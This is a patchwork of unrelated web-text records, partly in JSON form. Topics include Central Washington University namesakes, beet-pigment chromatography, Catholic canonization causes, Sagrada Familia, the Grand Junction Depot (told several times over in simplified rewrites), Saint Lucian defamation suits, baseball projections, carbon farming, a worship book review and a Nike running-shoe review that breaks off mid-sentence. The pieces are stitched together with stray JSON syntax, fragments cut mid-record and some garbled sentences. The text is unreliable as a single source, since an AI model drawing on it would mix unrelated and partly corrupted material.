In addition to her service to CWU, Margaret was also a poet and writer, her published works included college ballads, tribute poems for her colleagues, a booklet of rhymes for children called \"Out of the Sky\", a work called \"Polmes by Holmes,\" and editing of the Congressional Club Cook Book (the creation of which funded the mortgage for the Congressional club house). Margaret was married to Washington U.S. Congressmen, Hal Holmes. She is known for stepping in as a substitute for the main speaker and preparing a speech for the Congressional Club in 8 minutes flat.\nIn 1960 Central Washington named the Grupe Conference Center, in Honor of Mary A. Grupe, who served at Central Washington during 1897\u20131907 and then again during 1912\u20131929.\nMary A Grupe was born in Peabody Kansas in 1873. She attended the Oswego, New York Normal school, then went on to continue her education at the University of Chicago. She became a member of the Washington State normal school as an educator where she was head of the psychology department and a director of teacher training. Grupe also served a large purpose in the Ellensburg community as a member of the Governing Board of the Chamber of Commerce, as well as a member of the Ellensburg Park Board.\nSarah Spurgeon was a professor of painting and drawing in the Department of Art at Central Washington University from 1939 to 1971. Upon her retirement in 1971, she received the honor of professor emeritus. Along with her contributions to CWU, Spurgeon was also a part of community projects such as creating the memorial panels that decorate the Ellensburg Community Pool. In 1977, the Sarah Spurgeon Gallery was put up in Randall Hall in honor of Spurgeon's career at CWU.\n\u2191 \"Best Colleges 2014 \u2013 Central Washington University\". U.S. News & World Report.

{"text": "Abstract\t Two mixtures of decarboxylated and dehydrogenated betacyanins from processed red beet roots (Beta vulgaris L) juice were fractionated by high performance counter-current chromatography (HPCCC) producing a range of isolated components. Mixture 1 contained mainly betacyanins, 14,15-dehydro-betanin (neobetanin) and their decarboxylated derivatives while mixture 2 consisted of decarboxy- and dehydro-betacyanins. The products of mixture 1 arose during thermal degradation of betanin/isobetanin in mild conditions while the dehydro-betacyanins of mixture 2 appeared after longer heating of the juice from B. vulgaris L. Two solvent systems were found to be effective for the HPCCC. A highly polar, high salt concentration system of 1-PrOH-ACN-(NH4)(2)SO4 (satd. soln)-water (v/v/v/v, 1:0.:1.2:1) (tail-to-head mode) enabled the purification of 2-decarboxy-betanin/-isobetanin, 2,17-bidecarboxy-betanin/-isobetanin and neobetanin (all from mixture 1) plus 17-decarboxy-neobetanin, 2,15,17-tridecarboxy-2,3-dehydro-neobetanin, 2-decarboxy-neobetanin and 2,15,17-tridecarboxy-neobetanin (from mixture 2). The other solvent system included heptafluorobutyric acid (HFBA) as ion-pair reagent and consisted of tert-butyl methyl ether (TBME)-1-BuOH-ACN-water (acidified with 0.7% HFBA) (2:2:1:5, v/v/v/v) (head-to-tail mode). This system enabled the HPCCC purification of 2,17-bidecarboxy-betanin/-isobetanin and neobetanin (from mixture 1) plus 2,15,17-tridecarboxy-2,3-dehydro-neobetanin, 2,17-bidecarboxy-2,3-dehydro-neobetanin and 2,15,17-tridecarboxy-neobetanin (mixture 2). The results of this research are crucial in finding effective isolation methods of betacyanins and their derivatives which are meaningful compounds due their colorant properties and potential health benefits regarding antioxidant and cancer prevention.

He is in the first stage of the canonization process. Father Baker, as he is affectionately known by his diocese in Buffalo, NY, used his skills as a businessman to champion the needs of the poor. He created many institutions for the disadvantaged. Only after these institutions were financially independent did he build a magnificent basilica in honor of Our Lady of Victory.\nThe Daybreak crew traveled to El Salvador for interviews and footage on the anniversary of Archbishop Oscar Romero's death. He was shot and killed while saying mass at the altar. People in El Salvador believe he is a martyr. His cause is under way at the Vatican and he is a Servant of God. If the Vatican declares him a martyr he does not need a miracle to be beatified, but a miracle would be needed for him to be declared a saint by the Pope.\nBlessed Kateri Tekakwitha is the patron of the Native American Catholic movement. She was a Native American who converted to Catholicism in the 1600's. The Daybreak crew attended the Tekakwitha Conference in El Paso, TX. and gathered footage regarding her life story and the movement supporting her canonization. Daybreak also shot in Fonda, New York at the shrine of Blessed Tekakwitha, and in Kahanawake, (near Montreal) where Kateri spent the last of her years and where her tomb is located.\nSaint Maria Faustina Kowalska was a humble Polish nun who is said to have received the Message of Divine Mercy from Jesus. When Pope John Paul II was Archbishop of Krakow he initiated Saint Faustina's cause for canonization. Daybreak traveled to The Sanctuary of Divine Mercy in Krakow, Poland where interviews and footage were videotaped regarding the life of Saint Faustina. The crew also traveled to the U. S.

His wife Jessie (Elisabeth Risdon) reads a book about how women can make their men more successful, and decides to remake her husband to give him a new image.  Now dressed-for-success by his wife, Wilbur reports for work in fancy clothes.  Thinking he is dressed for a funeral, his boss (Edwin Maxwell), sends Wilbur home for the day.  When Wilbur is wandering perplexed in a nearby park, he is mistaken for the Park Commissioner.  Seeing it as an opportunity, McIntosh (Paul Harvey), a crooked politician who wishes to land a lucrative deal with the city to sell them new playground equipment, has the mayor (Robert Middlemass) appoint Wilbur as \"Playground Commissioner\".  Later, when Wilbur is about to denounce McIntosh as a crook, McIntosh has his wife (Charlotte Wynters) ply Wilbur with champagne.  While Wilbur is tipsy, Jessie overhears a flirtatious and damning conversation between the two.  Wilbur wakes up with a hangover, no pants, and learns that while intoxicated he brought disgrace to himself, the town, and his wife.

{"text": "Sagrada Familia: An Unfinished, Colossal Spanish Basilica, Under Construction for More than 136 Years\nBY Bir Singh \u2022 March 22, 2019\nSagrada Familia. (Bernard Gagnon / Wikimedia Commons)\nA Roman Catholic Church, Sagrada Familia, was conceptualized by a Spanish Christian, Josep Maria Bocabella (1815-1892), in the late 19th century. The industrial revolution was telling on the faith of masses in church and he thought he must do something to reverse the trend. So, he started the construction of this Church in Barcelona, in 1882. The first Architect, Francisco de Paula del Villar y Lozano, began work in neo-gothic design. He was removed in 1883 and replaced with Antoni Gaudi, the exponent of Catalan culture of Spain. The Church was then moulded in Gaudi's idiosyncratic design till his death. Then there were interruptions and sabbaticals, and 136 years passed by. But all along, the monument remained a tourist attraction and a functioning church.\nAntoni Gaudi. (Pau Audouard / Wikimedia Commons)\nGaudi was fired with missionary zeal\nA lover of nature, and Catholic by faith, Antoni Gaudi was best that Joseph Maria could have found to shape his vision. Inspired by real-life forms, Gaudi tried to replicate the organic world of God. He considered God as the Master Architect and worked hard to reflect His grace in whatever he did. So possessed was he about the task in hand that he never bothered about time and budget. All he cared for and mused about was his design which must be as live as real life. He lived frugally, like a hermit, and believed he was picked by God for the exposition of Christianity through Architecture. His conviction was as fierce as it was eccentric. No wonder, his contemporary Architects let him have his way than counsel him on his plan and procedures.\nAntoni Gaud\u00ed's contribution\nFrom 1915, Gaudi began work on Church building with crypt (underground room in the Church where important people are buried after death) which his predecessor had left unfinished. Then he moved on to nativity fa\u00e7ade (portico). As good a sculptor as an architect, he crowded walls with biblical scenes, saints, symbols, inscriptions and a medley of life forms ranging from reptiles, birds, seashells, fruits and flowers. The central part of the Church building was designed for choir (for 1,500 heads) and top for the chimes of bells.\nNature's Grace reflected in murals\nIn Gaudi's scheme, there was no place for straight lines and right angles. He revelled in tree-like columns which portrayed his view of Mother Nature. Images merged with, and flowed into, each other, not necessarily in good taste, but invariably shocking and surprising the onlookers in huge measure. Even his die hard critics advised every patriotic Spaniard to have a feel of Gaudi's 'superbly- creative-bad-taste'.\nDetails in the facade of the church. (A,Ocram / Wikimedia Commons)\nDeath didn't finish Gaudi's magic\nA brooding bachelor, Gaudi was hit by a tram while crossing a railway track in 1926. He died 3 days later, and was buried in the same crypt he began his work with. The thread of his unfinished work was picked up by his loyal team. With Spanish Civil War in 1936, work got derailed. A group of revolutionaries barged into the Church and destroyed models and drawings left by Gaudi. Catholicism came under attack. An attempt to bomb Sagrada Familia failed, but 40 churches in Barcelona were demolished. Twelve people associated with the Sagrada Familia project too, were killed.\nSagrada Familia in 1905. (Baldomer Gili i Roig / Wikimedia Commons)\nIn spite of the Spanish Civil War, construction of Sagrada Familia continued\nAs the civil war ended in 1939, little was left of Gaudi's blueprint on the building project. So, the construction work remained suspended for long. In 1960 there was a call to stop any further work on the proposed Church. It was argued that the monument was a piece of art which must be left untampered as a mark of respect for its creator \u2013 Antoni Gaudi. But the patrons of Sagrada Familia disagreed. Monument, they said, was more than just the memory of the late architect. That cleared the deadlock and the construction restarted in the 1970s. A new series of wall pictures were made under the supervision of sculptor Josep Maria Subirachs. These were about the brutality of the crucifixion of Jesus Christ.\nParametric design software gave a fillip to the project\nCome 1977 and the Church still had no roof and interiors. A team of Architects brainstormed to understand Gaudi's designs in order to complete the pending work, but failed. Even computer software, in the early nineties, couldn't unravel the secret of Gaudi's complex designs. But the dogged persistence of Mark Burry, the executive architect and researcher, paid off. He found that designers of aeroplanes worked with the same geometric complexity as Gaudi did. He therefore, used aeronautical software to decide the architectural strategy for working on interiors of Sagrada Familia. In a matter of coincidence, the buildings designed by American architect Frank Gehry had uncanny similarity to Gaudi's design. So, Mark Burry and Frank Gehry joined hands to create parametric design software. This software became a trendsetter in the early 2000s, with La Sagrada Familia as one of its users.\nFinal finish yet to happen\nWith parametric design, the work on interiors began in right unrest and got completed by 2010. But the Church is still far from a full and final completion. Much more remains to be done. It is hoped that the year 2026, the 100th death anniversary of Gaudi, may see the Church completed in all respects. That would put the cumulative construction period to a whopping 143 years. The building would then have 18 towers, the middle one being 560 feet high.\nAs of 2018, the brown coloured part in the model are already built and the remaining is yet to be completed. (Balou46 / Wikimedia Commons)\nSagrada Familia. (C messier / Wikimedia Commons)\nWhat made the church tick?\nWhat makes Sagrada Familia an object of undying curiosity, and most visited tourist site in Barcelona? The answer lies in its history and its architecture. The idea of the monument was conceived when the industrial revolution was being perceived as a threat to religion. Joseph Maria Bocabella alluded the misery of Barcelona's poor to their drift from religion. So, he set out, in his own way, to correct the fault. He would do it by building a church, dedicated to Mary, Joseph and Jesus- the holy family (La Sagrada Familia), which would inspire people to be religious and God-fearing.\nThe ceiling of the church. (SBA73 / Flickr)\nThe interior of Sagrada Familia. (Robertgombos / Wikimedia Commons)\nThe work began in Neo-Gothic style prevalent in Europe in those days. Come Gaudi, and his unique style got added to it. An amalgamation of myriad styles continued as the construction work lingered on for more than a century. Work, as it progressed, emerged as a heady cocktail of myriad views and perceptions. Whereas Gaudi's architecture seemed live and breathing, subsequent imitations of it were static and limp. The change, obviously, added to its mystery quotient, attracting 20 million visitors to this unfinished church every year.\nEnjoyed this article?

There are lots and lots of people from Golden Valley, MN who have written online reviews which are a good supply of information and facts. Make an effort to read between the lines and be as objective as you possibly can. Moreover, make sure the business you have decided on has been doing business for some time. It's a common thing for companies which screw up to rebrand themselves.\nThe next task is to book your transport. Pick a firm, reserve your transport and make sure to ask for a confirmation email. Remember that you then have to set up your automobile for transport. Get all of your things out of the vehicle. Unless you do that, the car transport company is not liable if your things go missing or damaged. Additionally, almost every vehicle transport company around Golden Valley, MN would probably advise you to have less than a 1 / 4 tank of fuel. Having a lighter load, the actual fuel usage during the transportation is decreased which implies reduced costs. Furthermore, cleaning your car before transportation would also be a good idea. This way it's much easier to identify the automobile condition both before and after the move.\nThe very first thing the driver of the carrier ought to do is examine your vehicle and note the damage. A double signed copy of the condition report will be made prior to transportation. Upon arrival, make sure no other problems, apart from those noted in the condition report, have appeared during transportation. This is actually extremely important mainly because it is the only occasion the company can be held responsible.\nIt's not at all hard to come by a good firm in Golden Valley, MN for transporting cars.

{"text": "Concentrations of platinum-group elements in samples from the Boulder Bed at five localities in the western Bushveld Complex range between 50 ppb and 70 ppm. Boulders thus have much more variable, and sometimes highly enriched, PGE contents relative to the other lithologies in the immediate foot-wall sequence of the Merensky Reef. The PGE enrichment can largely be modelled as a result of primary magmatic processes including collection of PGE by segregating sulphide melt and fractionation of mss. Other features of the Boulder Bed, such as the selvages of pure anorthosite and the chromitite stringers surrounding some of the boulders, bear evidence of recrystallisation. A model is proposed by which the Boulder Bed formed as a result of a combination of early and late magmatic processes. The PGEs were collected by magmatic sulphide melt which accumulated in a pyroxenite layer. The host rock to the pyroxenite was a thick package of norites which recrystallised in response to upward-migrating magmatic fluids. The fluids caused partial hydration melting of the norites adjacent to the pyroxenite, producing anorthosite. The boulders represent the broken-up remnants of the pyroxenite layer. The selvages of chromite and pure anorthosite around some of the boulders remain poorly understood, but may represent the latest recrystallisation event, in response to localised late-magmatic fluid overpressure upon cooling.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 13774}

{"text": "Grand Junction Depot\nThe Grand Junction Depot is a two-story Italian Renaissance railroad station built in 1906 to accommodate the city's growing rail traffic.\nThe Grand Junction Depot is a two-story Italian Renaissance railroad station built in 1906 to accommodate the city's growing rail traffic. A downtown landmark, the building serves as a reminder of the important role that railroads\u2014especially the Denver & Rio Grande (later the Denver & Rio Grande Western)\u2014played in Grand Junction's development. In 1992 Amtrak stopped using the historic depot, but in the 2010s local preservationists and developers decided to rehabilitate the building for new uses.\nThe Denver & Rio Grande in Grand Junction\nAs soon as Grand Junction was established in 1881, railroads began to eye the city as an important hub that would help them stretch their lines west toward Salt Lake City. The Denver & Rio Grande Railway rapidly built its main line toward the new city, and on November 22, 1882, the first locomotive arrived. The Rio Grande planned to make Grand Junction a regional headquarters, so it bought a large amount of Grand Junction Town Company stock and acquired land by its tracks on the southwest edge of town for a major repair facility and switchyard. The railroad soon became one of Grand Junction's largest employers, and it helped the city grow by bringing an influx of new residents (including many immigrants), businesses, and tourists. Thanks to the railroad, Grand Junction took shape as the most important transportation and business center on the Western Slope.\nGrowing City Gets New Depot\nThe first railroad depot in Grand Junction was a simple log structure alongside the tracks. In early 1884 it was replaced by a two-story Queen Anne style depot that was one of the largest buildings in town. In the early 1900s a sugar beet boom caused Grand Junction's population to double from 3,500 to 7,000 in just five years. Four railroads operated out of the city, including the Rio Grande and the Colorado Midland, and they soon needed a larger depot to handle their growing passenger and freight traffic.\nConstruction on the new depot began on April 6, 1905, on a site just south of the existing depot. The depot was completed in September 1906 at a cost of $60,000. It was located at the far southwest corner of downtown where Pitkin Avenue met South Second Street, facing the city's street grid at a forty-five-degree angle. Designed by Chicago architect Henry J. Schlack, it was a two-story Italian Renaissance structure made of white brick with terra cotta ornamentation and a red tile roof. The second floor featured arched stained-glass windows.\nInside, the depot had a large oval waiting room that was considered one of the finest in the region: sixty-six feet long, thirty-three feet wide, with a twenty-two-foot ceiling and solid oak woodwork. From the main waiting room, passengers could access the ticket office, a small alcove with a fireplace, and large and lavish restrooms. Upstairs, railroad and Western Union workers occupied offices on the northeast side of the building. A one-story extension southeast of the main building contained the baggage room and offices for the Wells Fargo and Globe Express shipping companies.\nLocal Landmark\nDuring the twentieth century, the Grand Junction Depot's original interior was slowly covered by decades of alterations. The woodwork in the waiting room was painted, parts of the large restrooms were converted to offices, and the fireplace alcove became a storage space. In the 1920s the waiting room's high ceiling was dropped to make room for more second-floor offices. Nevertheless, the depot became a local landmark because of its size, stylish architecture, and angled position relative to the rest of downtown.\nThe building represented one of the largest regional employers\u2014the Rio Grande\u2014which remained important even after the shift from steam locomotives to diesel engines in the 1950s allowed the railroad to operate with a smaller workforce. Despite the rise in trucking and air travel in the late twentieth century, Grand Junction's freight rail traffic remained strong thanks to the region's growing coal, oil, and gas development. The Rio Grande continued to use Grand Junction as a regional hub and employed plenty of workers to maintain its trains and rails in western Colorado and eastern Utah.\nFor decades the depot continued to serve passengers on the California Zephyr and later the Rio Grande Zephyr, the last non-government-owned long-distance passenger train in the United States. In 1983 the Rio Grande gave up the route because of a lack of passengers, and it was incorporated into the Amtrak system. Amtrak introduced new trains and started making daily trips between Denver and Salt Lake City, which helped increase ridership. In 1992, however, Amtrak moved its passenger depot to a converted building nearby, claiming that the historic depot was unsafe because it had not been maintained.\nThe same year that Amtrak moved out, the depot was listed on the National Register of Historic Places. To prevent further deterioration, local preservationists and railroad enthusiasts soon secured a State Historical Fund grant to replace the building's roof. Various ideas for adaptive reuse of the depot cropped up, but nothing worked out and the building remained vacant in the 1990s and 2000s.\nIn 2010 Colorado Preservation, Inc. named the building one of the state's Most Endangered Places to spur interest in its restoration. Since then, Colorado Preservation has worked with Friends of the Grand Junction Railroad Depot and the city of Grand Junction to develop plans for rehabilitating the building as a train station and commercial center.\nThe Grand Junction Depot is a two-story railroad station built in 1906 in the Italian Renaissance style. It was built to serve the city's growing railway traffic. It is a downtown landmark that serves as a reminder of the important role that railroads played in Grand Junction's development. One of the most important railroad companies at that time was the Denver & Rio Grande (D&RG). In later years, Amtrak (the US government rail system) took over railway service in the area. In 1992 Amtrak stopped using the historic depot. In the 2010s, local business people and others with an interest in preserving the historic building decided to update the building for new uses.\nGrand Junction was established in 1881, shortly after the Ute people were forced from western Colorado. Soon afterward, railroad companies began to consider the new city as a location for a hub that would help the rail companies grow. They wanted to continue their rail lines from Denver west toward Salt Lake City. Grand Junction was a handy stopping point along the way. The Denver & Rio Grande Railway rapidly built its main railway tracks toward the new city of Grand Junction. On November 22, 1882, the first locomotive arrived there. The D&RG also planned to make Grand Junction one of its regional headquarters for office workers and train mechanics. The company bought a large amount of Grand Junction Town Company stock and purchased land by its tracks. The land was on the southwest edge of town to be used for a major repair facility and switchyard. The railroad company soon became one of Grand Junction's largest employers.

In the early 1900s, many farmers began to grow sugar beets, which were used to make sugar. This increase in farming and sugar-making activity in the area caused Grand Junction's population to double from 3,500 to 7,000 in just five years. Four railroad companies operated out of the city, including the D&RG and the Colorado Midland. They soon needed a larger depot to handle the growing amount of passenger and freight traffic.\nConstruction on the new depot began on April 6, 1905, on a site just south of the existing depot. The new depot was completed in September 1906 at a cost of $60,000. It was located at the far southwest corner of downtown where Pitkin Avenue met South Second Street. The depot building was built on the land at an interesting forty-five-degree angle compared to the grid of city streets. It was designed by Chicago architect Henry J. Schlack. The two-story structure was made of white brick with terra cotta ornamentation and a red tile roof. The second floor featured arched stained-glass windows. This architecture style is called Italian Renaissance.\nInside, the depot had a large oval waiting room that was considered one of the finest in the region. It was sixty-six feet long, thirty-three feet wide, with a twenty-two-foot high ceiling and it had solid oak woodwork. From the main waiting room, passengers could access the ticket office, a small nook with a fireplace, and large and lavish restrooms. In the upstairs area of the building, there were business offices on the northeast side of the building for railroad workers and Western Union telegraph workers. A one-story area on the southeast end of the main building contained the baggage room and offices for the Wells Fargo and Globe Express shipping companies.\nDuring the twentieth century, the Grand Junction Depot's original interior was slowly covered by decades of alterations. The woodwork in the waiting room was painted, parts of the large restrooms were converted to offices, and the fireplace nook area became a storage space. In the 1920s the waiting room's high ceiling was made lower to make room above it for more second-floor offices. Even with these many changes, the depot became a local landmark because of its size, stylish architecture, and angled position compared to the rest of downtown.\nThe building represented the D&RG, which was one of the largest regional employers. This company remained important even after the company needed fewer workers when the trains were changed from using steam locomotives to diesel engines in the 1950s. Despite the rise in trucking and air travel after World War II, Grand Junction's freight rail traffic remained strong thanks to the region's growing coal, oil, and gas development. The D&RG continued to use Grand Junction as a regional hub. They employed plenty of workers to maintain its trains and rails in western Colorado and eastern Utah.\nFor many decades, the depot continued to serve passengers for a train called the California Zephyr and later called the Rio Grande Zephyr. This train was the last long-distance passenger train in the United States that was owned and operated by a private company, and not by the government. In 1983 the D&RG gave up the route because of a lack of passengers. This route was taken over by the government-run Amtrak train system. Amtrak bought new trains and started making daily trips which passed through Grand Junction on its route between Denver and Salt Lake City. This new rail schedule helped increase the number of passengers. In 1992 Amtrak moved its passenger depot from the historic 1906 depot building to a different building nearby. Amtrak claimed that the historic depot was unsafe because it had not been kept in good repair.\nThe same year that Amtrak moved out, the 1906 depot was listed in the National Register of Historic Places. Local business people and others with an interest in preserving the historic building replaced the building's roof to prevent further damage. The money for the new roof came from a State Historical Fund grant. Various ideas for alternate uses of the depot were considered, but nothing worked out. The building remained vacant in the 1990s and 2000s.\nIn 2010 Colorado Preservation, Inc. named the depot building as one of the state's Most Endangered Places to encourage interest in its restoration. Since then, Colorado Preservation has worked with Friends of the Grand Junction Railroad Depot and the city of Grand Junction. Together they developed plans for additional repairs so the building could be used as a train station and commercial center.\nThe Grand Junction Depot is a two-story railroad station built in 1906. Its architecture style is called Italian Renaissance. It was built to serve the new city's growing railway traffic. It is a downtown landmark. In the late nineteenth century, railroads had an important role in Grand Junction's early growth. One of the most important was the Denver & Rio Grande Railroad (D&RG).\nIn later years, a different business called Amtrak took over Grand Junction's passenger rail service. Amtrak is the rail system run by the United States government. In 1992 Amtrak stopped using the historic depot. In the 2010s, local businesspeople and others with an interest in preserving the historic building decided to update the building for new uses.\nGrand Junction was founded in 1881. Soon afterward, railroad companies wanted to reach the area. They wanted to add tracks west from Denver toward Salt Lake City, and Grand Junction was a handy stopping point along the way. The Denver & Rio Grande Railway rapidly built its new tracks toward Grand Junction. On November 22, 1882, the first train arrived there on the new tracks. The D&RG also wanted many of their office workers and train mechanics to be located in Grand Junction. So the company bought land in Grand Junction next to its tracks. The railroad company soon became one of Grand Junction's largest employers. The railways helped the city grow by bringing in new residents, businesses, and tourists.

In the 1950s, the trains were changed from steam locomotives to diesel engines. Fewer workers were needed to operate and repair the new engines. Yet even with fewer workers, the D&RG was still an important company. After World War II, people and goods increasingly traveled on trucks and airplanes. But the railroads were still important because they hauled cargo for the area's growing coal, oil, and gas development. They also still needed plenty of workers to maintain their trains and rails in western Colorado and eastern Utah.\nFor many decades, the depot continued to serve passenger trains, too.

{"text": "At least three high-ranking Saint Lucian public officials have announced plans to sue a local radio broadcaster for defamation after the broadcaster read on-air an investigative news article alluding to possible wrongdoing by members of the current governing party.\nThe International Press Institute (IPI) has expressed concern over the intent behind the lawsuits, noting that questions have arisen not only as to which content the officials found objectionable; but also as to why the latter have chosen to sue a broadcaster who read a publicly-available news item without comment and not the regional, United States-headquartered online news site that actually wrote the article.\nTimothy Poleon, host of the program \"Newsspin\" on Radio Caribbean read the article in its entirety on Sept. 25, the same day it was published by Caribbean News Now. The article suggested that the U.S. government's recent decision to terminate security-related assistance to Saint Lucia, ostensibly over apparent human rights violations, may also have been influenced by a local \"propaganda campaign\" that some claim deliberately misled the United States into cancelling the visa of Richard Frederick, a former Saint Lucian government minister, in 2011.\nAt least three government officials \u2013 Legal Affairs Minister Phillip La Corbiniere; Tourism, Heritage and Creative Industries Minister Lorne Theophilus; and Senate President Claudius Francis \u2013 have now stated their intention to sue Poleon for defamation.\nAccording to pre-action protocol letters obtained by IPI, lawyers for Theophilus and Francis allege that Poleon had \"substantially harmed\" their clients' reputation through \"defamatory words, the nature of which are deeply distressing and embarrassing to our client.\" The letter specified as defamatory a paragraph, among others, in which the article's author referred to two unnamed \"prominent\" Saint Lucia government officials who the article said had engaged in a particular criminal activity. The description used could \"reasonably lead people\" to identify the officials in question, the letter alleges.\nAmong other questions, it was not immediately clear why, if the paragraph refers to two government officials, three have announced suits, with possibly more to come. La Corbiniere, the first to threaten legal action, has never specified publicly which additional content he found offensive. The legal affairs minister also added recently that \"a number of ministers have also instructed their attorneys to begin to take legal action of various kinds,\" without going into detail as to the cause for that action.\nSpeaking to IPI, Caribbean News Now editor Barry Randall said he was \"completely at a loss to understand what in our original article is remotely actionable \u2013 which tends to raise the suspicion of media intimidation pure and simple\". Rick Wayne, editor of the St. Lucia Star, added that he was \"convinced the whole aim is to frighten the rest of the media\", which, he added, \"is easy to do\".\nAnnouncing his plans to sue Poleon and Radio Caribbean over the Frederick article, La Corbiniere said that he would not let his reputation be \"destroyed\" by \"a ragtag called Caribbean News because it's nothing more than a ragtag\". He added that he did not seek to \"muzzle the press\", but that \"things have to be done properly and [journalists] cannot pursue this type of agenda\". Indeed, the minister has accused the media of embarking on a \"concerted effort to undermine\" him, without providing details; he has also not specified why he was targeting Poleon and Radio Caribbean in particular, but not Caribbean News Now.\nIn August, the U.S. State Department announced it would end cooperation with the Saint Lucian police force based on the Leahy amendment, which prohibits the U.S. government from providing assistance to security forces that have been accused of human-rights abuses. Saint Lucian Prime Minister Dr. Kenny Anthony said in a public address later that month that the decision was related to 12 reported extrajudicial killings that took place on the island between 2010 and 2011.\n\"The constitution guarantees freedom of speech, which is respected in practice\"", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 39754}

The speaker of parliament & several government ministers are affiliated with such groups, which is part of the reason Slava Ukraina has become so much more politically charged than necessary.\nObviously the main reason he said that is just to troll the Russians, which I totally support.

I call this tweaking, and it makes the boring regressions a little more lively and the overall correlation of the projections a good bit higher.\nThen I scale everything so that the top 400 players projections are similar in total to the top 400 players actual stats. But the extremes in each stat just aren't there, because the leaders in all categories usually change from year to year.\nPs. I would not bet my life savings on the accumulation of any counting stat in a year when the Basic Agreement between the players and owners expires.\nYou also have the MLB HR leader with 39 home runs.\nWhen was the last time NOBODY hit 40 home runs?\nOne of the byproducts of the system is that the AB of regular players are reduced about 10 percent off their usual peaks, with a similar reduction in the other stats. So all the guys who would project to 43 homers end up at 39 or 38.\nThe reason the AB get reduced is because about 10 percent of expected AB from year to year are lost to injury or other problems. This doesn't happen evenly, but it happens consistently. There are two ways to handle this. One would be to ignore it and give all players their full measure of AB and stats. The other is to scale the pool of projected stats to the actual stats that will be produced by the pool.\nI do the latter, because it gives a more accurate assessment of how groups of players perform on the year. The other looks better when everyone stays healthy, but since they never all do my method measures as more accurate.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 30097}
{"text": "As climate change awareness and concern increases, agriculture has come under increasing scrutiny for its often negative impact on the environment.\nYet, agriculture, and organic agriculture in particular, is the ONE sector that has the ability to transform from a net emitter of CO2 to a net sequesterer of CO2. No other human-managed enterprise has the ability to affect this great a contribution to reducing climate change. For instance, using multiple methods of Carbon Farming increases the rate at which CO2 is removed from the atmosphere and converted to plant material and/or soil organic matter.\nSo Organic Valley's sustainability team is partnering with the sustainability folks at Annie's Organic, The Carbon Cycle Institute and the California Resource Conservation Districts to develop comprehensive dairy Carbon Farm Plans, which take into account whole-farm carbon flows.\nWith financial assistance from Annie's and Organic Valley, three Organic Valley family farms in California will complete three Carbon Farm Plans. It's important to start with these farms since California state legislation requires dairy and livestock farms to reduce methane emissions by up to 40% by 2030.\nIn 2018, this initiative will be expanded to other California farmers.

{"text": "In her new book, The Next Worship, Sandra Maria Van Opstal challenges worshipers and worship leaders to a new understanding of how to glorify God in our diverse world. She asks the questions, \"When the church invites others to the table in worship, what assumptions do we make about what is and is not normal?\" and \"What happens when a diverse church glorifies the global God?\" These questions (and the other questions she raises) are much needed questions to be discussed, as the people of the world (and the church alike) can often seem to have grown increasingly polarized from one another. Primarly, we get stuck in a narrow perspective of who are God is and who we are as His church. We tend to think that everyone thinks and acts like we do and we even fantasize about a God who looks like us! We forget that the church down the street (let alone across the globe!) can have significantly different approaches to worship that we do and as a result, we tend to insist upon others \"doing church\" or \"doing life\" the way that we do. This problem, in itself, reveals our need for a God who is other and has created a vastly diverse Creation to reflect His image. For this reason and others, Van Opstal's book is timely and needed.\nThe church where we worship, Greenwood Community Church in Greenwood Village, Colorado, is increasingly waking up to these questions, as we seek to be formed as a body of Christ-followers that invites men and women (and children and youth and the elderly) from every tongue, tribe, and nation into a unified corporate expression of the worship of Jesus Christ. This is no easy task, as the potential divisions are endless. The devil, who seeks only to \"steal, kill, and destroy\" (John 10:10) has been creating divisions since the beginning. And, Melkor sang a new melody of discord in Tolkien's Middle-Earth origin, the devil has continued to sow discord in the world to this day. It is for this reason that Paul warned the church in Rome, \"I urge you, brothers and sisters, to watch out for those who cause divisions and put obstacles in your way that are contrary to the teaching you have learned. Keep away from them. For such people are not serving our Lord Christ, but their own appetites. By smooth talk and flattery they deceive the minds of naive people.\" (Romans 16:17-18). In this way, to watch out for this division is really the first step among many.\nSo, how can we know if we are praising the same God? The starting (and finish) line is found in the greatest commandments ever given: loving God and loving our neighbors as ourselves (Matthew 22:36-40). And, as you might recall, we are given a stern warning in Scripture of the consequences of loving God and hating our brother or sister. As we seek to remember Christ at the table in our churches and our homes, may we diligently pursue a posture of love for our Global God and His children of every tongue, tribe, and nation!", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 74226}

Such was the infatuation, the US sportswear giant had an enormous \"1:59\" daubed across a wall in its Portland, Oregon HQ. This served as a reminder to all about the superhuman challenge the company had set itself.\nNike achieved its goal in 2019. Its legendary distance runner and ambassador Eliud Kipchoge clocked a time of 1:59:40 in Vienna, Austria. Obviously, the Kenyan's natural ability was paramount in breaking the record, but the sub-two-hour weapon \u2013 or weapons \u2013 at his disposal were Nike's controversial running shoes. The Nike Alphafly propelled Kipchoge to the finish line \u2013 quite literally.\nFitted with three carbon fibre plates extra cushioning pods, the Alphafly is arguably the world's most technically advanced running shoe. It recycles the energy from each stride that hits the ground to give the wearer a little forward propulsion.\nWhile this tech has long been used in the world of running shoes to make athletes faster and more efficient with their power distribution, Nike is the first to demonstrably prove it on the world stage.\nWe know it helped achieve the almost impossible, but what of the average person on the street? Although the Alphafly was a one-off for Kipchoge, Nike has an equivalent for the masses \u2013 the tongue-twisting Nike Air ZoomX Alphafly NEXT%. So, I decided to find out if they could make me \u2013 a non-competitive runner \u2013 any better.\nReady for action\nIt's worth pointing out that I like the idea of running for fitness, but I'm by no means a fan of it. I'm more of a cyclist. So, Nike already has its work cut out to encourage me to clock up the miles in its shoes.\nWhat you first notice is how chunky they are. The carbon fibre plate is squeezed between generous amounts of Nike's foam technology, and two Zoom Air units that are essentially air-filled cushions.\nNot only do I feel a few inches taller in them, but there's a certain sense of occasion every time I slip them on. It's like putting on a pair of football boots. You then know you're ready to play football in them.\nIt's the same with the Nike Air ZoomX Alphafly NEXT% \u2013 put them on, and you feel like you're ready to run. They're less a fashion accessory and more a piece of serious kit for you to perform in.\nLike any good piece of equipment, these running shoes need to be worn in to unleash their potential. The first few strides in these boxfresh numbers sound a little weird, a bit like you're running in flip-flops. But once they're supple, they're a revelation.\nNike Alphafly by\nWhat's impressive is the way that the Alphafly has an uncanny way of making you run properly. I'd say I'm pretty flat-footed when it comes to running, but the construction of the shoe seems to automatically fix my gait. This might not be the case for everyone, but it certainly felt like they fixed my technique.\nIt's clear within the first few strides that the Alphafly isn't built like other shoes. It wants to drive you forward as quickly as possible. I felt like I was trying to keep up with the shoes' acceleration rather than vice-versa.\nWithout trying too 